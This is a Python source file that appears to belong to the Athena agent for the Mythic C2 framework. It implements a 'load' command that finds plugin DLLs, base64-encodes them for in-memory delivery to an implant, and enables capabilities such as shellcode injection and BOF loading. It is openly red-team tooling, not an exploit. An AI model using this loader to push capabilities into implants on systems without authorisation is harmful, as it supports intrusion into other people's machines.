import subprocess
from .athena_utils import plugin_utilities, message_utilities
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import base64
import os
import pathlib

from .athena_utils import message_converter

class LoadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        self.args = [
            CommandParameter(
                name="command", cli_name="command", display_name="Command to Load", type=ParameterType.ChooseOne,
                choices_are_all_commands=True,
                description="Load Command",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=0
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        if self.command_line[0] == "{":
                tmpjson = json.loads(self.command_line)
                self.load_args_from_json_string(json.dumps(tmpjson))
        else:
                self.load_args_from_json_string(self.command_line)



class LoadCommand(CommandBase):
    cmd = "load"
    needs_admin = False
    help_cmd = "load cmd"
    description = "This loads a new plugin into memory via the C2 channel."
    version = 1
    author = "@checkymander"
    parameters = []
    attackmapping = ["T1030", "T1129", "T1059.002", "T1620"]
    argument_class = LoadArguments
    attributes = CommandAttributes(
        load_only=False,
        builtin=True
    )

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            #CompletionFunctionName="functionName"
        )
        command = taskData.args.get_arg('command')

        bof_commands = plugin_utilities.get_coff_commands()
        shellcode_commands = plugin_utilities.get_inject_shellcode_commands()
        ds_commands = plugin_utilities.get_ds_commands()

        if command in bof_commands:
            await message_utilities.send_agent_message("Please load coff to enable this command", taskData.Task)
            raise Exception("Please load coff to enable this command")
        elif command in shellcode_commands:
            await message_utilities.send_agent_message("Please load shellcode-inject to enable this command", taskData.Task)
            raise Exception("Please load shellcode-inject to enable this command")
        elif command in ds_commands:
            await message_utilities.send_agent_message("Please load ds to enable this command", taskData.Task)
            raise Exception("Please load ds to enable this command")
        
        command_checks = {
            "bof": plugin_utilities.get_coff_commands,
            "shellcode": plugin_utilities.get_inject_shellcode_commands,
            "ds": plugin_utilities.get_ds_commands,
        }

        #Check if command is loadable via another command
        for command_type, check_function in command_checks.items():
            if command in check_function():
                await message_utilities.send_agent_message(f"Please load {command_type} to enable this command", taskData.Task)
                raise Exception(f"Please load {command_type} to enable this command")

        command_libraries = {
            "ds": [{"libraryname": "System.DirectoryServices.Protocols.dll", "target": "plugin"}],
            "ssh": [{"libraryname": "Renci.SshNet.dll", "target": "plugin"},{"libraryname":"SshNet.Security.Cryptography.dll", "target":"plugin"}],
            "sftp": [{"libraryname": "Renci.SshNet.dll", "target": "plugin"},{"libraryname":"SshNet.Security.Cryptography.dll", "target":"plugin"}],
            "screenshot": {"libraryname": "System.Drawing.Common.dll", "target": "plugin"},
            # Add more commands as needed
        }

        command_plugins = {
            "coff": bof_commands,
            "ds": ds_commands,
            "inject-shellcode": shellcode_commands,
        }

        # Check if command requires 3rd party libraries
        
        if command in command_libraries:
            for lib in command_libraries[command]:
                print("Kicking off load-assembly for " + json.dumps(lib))
                createSubtaskMessage = MythicRPCTaskCreateSubtaskMessage(taskData.Task.ID,
                                                                        CommandName="load-assembly",
                                                                        Params=json.dumps(lib),
                                                                        ParameterGroupName="InternalLib"
                                                                        )
                subtask = await SendMythicRPCTaskCreateSubtask(createSubtaskMessage) 

        if command in command_plugins:
            resp = await SendMythicRPCCallbackAddCommand(MythicRPCCallbackAddCommandMessage(
                TaskID = taskData.Task.ID,
                Commands = command_plugins[command]
            ))
            if not resp.Success:
                raise Exception("Failed to add commands to callback: " + resp.Error)
            
        dllFile = os.path.join(self.agent_code_path, "bin", f"{command.lower()}.dll")
        dllFile2 = os.path.join(self.agent_code_path, "bin", f"{command.lower()}-{taskData.Payload.OS.lower()}.dll")    

        # Try OS dependant first  
        if not os.path.isfile(dllFile2):
            # Fallback to generic
            if not os.path.isfile(dllFile):
                await message_utilities.send_agent_message("Please wait for plugins to finish compiling.", taskData.Task)
                raise Exception("Please wait for plugins to finish compiling.")
            else:
                await message_utilities.send_agent_message("Using backup DLL", taskData.Task)
                with open(dllFile, 'rb') as file:
                    dllBytes = file.read()

        else:
            await message_utilities.send_agent_message("Using main DLL", taskData.Task)
            with open(dllFile2, 'rb') as file:
                    dllBytes = file.read()

        encodedBytes = base64.b64encode(dllBytes)
        taskData.args.add_arg("asm", encodedBytes.decode())





    # async def create_tasking(self, task: MythicTask) -> MythicTask:
    #     command = task.args.get_arg('command')

    #     bof_commands = plugin_utilities.get_coff_commands()
    #     shellcode_commands = plugin_utilities.get_inject_shellcode_commands()
    #     ds_commands = plugin_utilities.get_ds_commands()

    #     if command in bof_commands:
    #         await message_utilities.send_agent_message("Please load coff to enable this command", task)
    #         raise Exception("Please load coff to enable this command")
    #     elif command in shellcode_commands:
    #         await message_utilities.send_agent_message("Please load shellcode-inject to enable this command", task)
    #         raise Exception("Please load shellcode-inject to enable this command")
    #     elif command in ds_commands:
    #         await message_utilities.send_agent_message("Please load ds to enable this command", task)
    #         raise Exception("Please load ds to enable this command")
        
    #     command_checks = {
    #         "bof": plugin_utilities.get_coff_commands,
    #         "shellcode": plugin_utilities.get_inject_shellcode_commands,
    #         "ds": plugin_utilities.get_ds_commands,
    #     }

    #     #Check if command is loadable via another command
    #     for command_type, check_function in command_checks.items():
    #         if command in check_function():
    #             await message_utilities.send_agent_message(f"Please load {command_type} to enable this command", task)
    #             raise Exception(f"Please load {command_type} to enable this command")

    #     command_libraries = {
    #         "ds": [{"libraryname": "System.DirectoryServices.Protocols.dll", "target": "plugin"}],
    #         "ssh": [{"libraryname": "Renci.SshNet.dll", "target": "plugin"},{"libraryname":"SshNet.Security.Cryptography.dll", "target":"plugin"}],
    #         "sftp": [{"libraryname": "Renci.SshNet.dll", "target": "plugin"},{"libraryname":"SshNet.Security.Cryptography.dll", "target":"plugin"}],
    #         "screenshot": {"libraryname": "System.Drawing.Common.dll", "target": "plugin"},
    #         # Add more commands as needed
    #     }

    #     command_plugins = {
    #         "coff": bof_commands,
    #         "ds": ds_commands,
    #         "inject-shellcode": shellcode_commands,
    #     }

    #     # Check if command requires 3rd party libraries
        
    #     if command in command_libraries:
    #         for lib in command_libraries[command]:
    #             print("Kicking off load-assembly for " + json.dumps(lib))
    #             createSubtaskMessage = MythicRPCTaskCreateSubtaskMessage(task.id,
    #                                                                     CommandName="load-assembly",
    #                                                                     Params=json.dumps(lib),
    #                                                                     ParameterGroupName="InternalLib"
    #                                                                     )
    #             subtask = await SendMythicRPCTaskCreateSubtask(createSubtaskMessage) 

    #     if command in command_plugins:
    #         resp = await SendMythicRPCCallbackAddCommand(MythicRPCCallbackAddCommandMessage(
    #             TaskID = task.id,
    #             Commands = command_plugins[command]
    #         ))
    #         if not resp.Success:
    #             raise Exception("Failed to add commands to callback: " + resp.Error)
            
    #     dllFile = os.path.join(self.agent_code_path, "bin", f"{command.lower()}.dll")
    #     dllFile2 = os.path.join(self.agent_code_path, "bin", f"{command.lower()}-{taskData.Payload.OS.lower()}.dll"))      
    #     if not os.path.isfile(dllFile):
    #         #await self.compile_command(command, os.path.join(self.agent_code_path, "AthenaPlugins"))
    #         await message_utilities.send_agent_message("Please wait for plugins to finish compiling.", task)
    #         raise Exception("Please wait for plugins to finish compiling.")
        
    #     with open(dllFile, 'rb') as file:
    #         dllBytes = file.read()
    #         encodedBytes = base64.b64encode(dllBytes)
    #         task.args.add_arg("asm", encodedBytes.decode())

    #     return task
    
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if "message" in response:
            user_output = response["message"]
            await MythicRPC().execute("create_output", task_id=task.Task.ID, output=message_converter.translateAthenaMessage(user_output))

        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp

    async def get_commands(self, response: AgentResponse):
        pass

    async def compile_command(self, command_name, path):
        #p = subprocess.Popen(["dotnet", "build", command_name], cwd=path)
        #fuck it build all of them
        p = subprocess.Popen(["dotnet", "build", command_name], cwd=path)
        p.wait()
        streamdata = p.communicate()[0]
        rc = p.returncode
        if rc != 0:
            raise Exception("Error compiling: " + str(streamdata))